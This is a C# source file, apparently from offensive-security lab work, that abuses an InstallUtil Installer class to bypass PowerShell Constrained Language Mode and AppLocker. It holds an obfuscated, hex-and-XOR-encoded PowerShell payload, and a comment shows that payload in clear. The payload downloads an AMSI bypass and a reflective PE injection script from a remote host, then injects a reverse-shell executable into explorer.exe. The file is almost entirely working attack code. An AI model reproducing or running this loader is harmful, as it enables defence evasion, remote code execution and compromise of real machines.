using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    // Bypassses CLM and AppLocker
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/isma.txt')) ; (New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/Invoke-ReflectivePEInjection.ps1') | IEX ; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://192.168.45.177/exec-revshell.exe') -ProcId (Get-Process -Name explorer).Id
            string cmd = "52466333335966783e60657d667c773b6c828c77667e39596677395866655c7f726679773239478078797f807a676c777572796833287377778b4d40404a4235394a3143393736394a383840728c7e7a397783772832323b443b335966783e60657d667c773b6c828c77667e39596677395866655c7f726679773239478078797f807a676c777572796833287377778b4d40404a4235394a3143393736394a3838405279718074663e5566617f667c777271666b4652797d667c77728079398b8c4a28323b8f3b5246633b443b5279718074663e5566617f667c777271666b4652797d667c777280793b3e6b46458277668c3b335966783e60657d667c773b6c828c77667e39596677395866655c7f726679773239478078797f807a67477a777a33287377778b4d40404a4235394a3143393736394a3838406683667c3e7566718c73667f7f3966836628323b3e6b75807c52673b334866773e6b75807c668c8c3b3e597a7e663b66838b7f8075667532395267";

            byte[] cmdBytes = new byte[cmd.Length / 2];
            for (int i = 0; i < cmdBytes.Length; i++)
            {
                cmdBytes[i] = Convert.ToByte(cmd.Substring(i * 2, 2), 16);
            }

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                cmdBytes[i] = (byte)(((uint)cmdBytes[i] - 17) & 0xFF);
            }

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                cmdBytes[i] = (byte)((uint)cmdBytes[i] ^ 0x74);
            }

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                cmdBytes[i] = (byte)(((uint)cmdBytes[i] - 5) & 0xFF);
            }

            for (int i = 0; i < cmdBytes.Length; i++)
            {
                cmdBytes[i] = (byte)((uint)cmdBytes[i] ^ 0x79);
            }

            string transformedCmd = System.Text.Encoding.ASCII.GetString(cmdBytes);
            Console.WriteLine("Running: " + transformedCmd);

            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;
                    ps.AddScript(transformedCmd);

                    var results = ps.Invoke();

                    foreach (var result in results)
                    {
                        Console.WriteLine(result);
                    }
                }
                rs.Close();
            }
        }
    }
}
